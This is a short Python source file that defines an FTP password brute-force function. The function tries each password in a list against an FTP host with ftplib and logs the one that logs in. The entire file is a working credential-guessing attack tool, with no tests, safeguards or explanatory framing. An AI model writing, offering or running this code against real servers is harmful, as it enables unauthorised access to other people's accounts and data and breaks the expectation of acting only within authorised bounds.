from ftplib import FTP
from utils import logger

def ftp_brute_force(host, username, password_list):
    for password in password_list:
        try:
            ftp = FTP(host)
            ftp.login(user=username, passwd=password)
            logger.info(f"Password Found: {password}")
            ftp.quit()
            return
        except:
            logger.warn(f"Failed: {password}")
